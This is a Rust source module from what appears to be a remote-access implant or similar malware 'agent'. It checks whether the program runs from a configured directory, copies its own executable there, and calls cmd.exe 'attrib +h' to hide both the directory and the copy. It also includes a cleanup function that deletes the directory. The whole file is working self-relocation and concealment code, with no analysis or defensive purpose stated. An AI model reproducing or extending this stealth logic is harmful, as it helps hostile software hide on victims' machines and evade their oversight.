use crate::config;

use std::env;
use std::fs;
use std::path::Path;
use std::process;

// will check if the agent is running from the right directory
pub fn check_desired_dir() -> bool {
    env::current_dir().unwrap().to_str().unwrap() == config::filesystem::DESIRED_DIR
}

// move the agent to the desired directory mentioned in the config file
pub fn move_to_desired_dir() {
    // check if the directory exists and create it if it isn't
    if !Path::new(config::filesystem::DESIRED_DIR).exists() {
        fs::create_dir(config::filesystem::DESIRED_DIR).unwrap();
    }

    // check if a same-named file already exists
    if !Path::new(config::filesystem::AGENT_PATH).exists() {
        fs::copy(env::current_exe().unwrap(), &config::filesystem::AGENT_PATH).unwrap();

        // set both agent dir and executable to be hidden
        let _add_h_dir = process::Command::new("cmd.exe")
            .args(&["/Q", "/C", "attrib", "+h", &config::filesystem::AGENT_PATH])
            .spawn()
            .unwrap();
        let _add_h_file = process::Command::new("cmd.exe")
            .args(&["/Q", "/C", "attrib", "+h", &config::filesystem::DESIRED_DIR])
            .spawn()
            .unwrap();
    }
}

// remove agent correct dir
pub fn rm_desired_dir() {
    if Path::new(config::filesystem::DESIRED_DIR).exists() {
        fs::remove_dir_all(format!("{}", config::filesystem::DESIRED_DIR)).unwrap();
    }
}
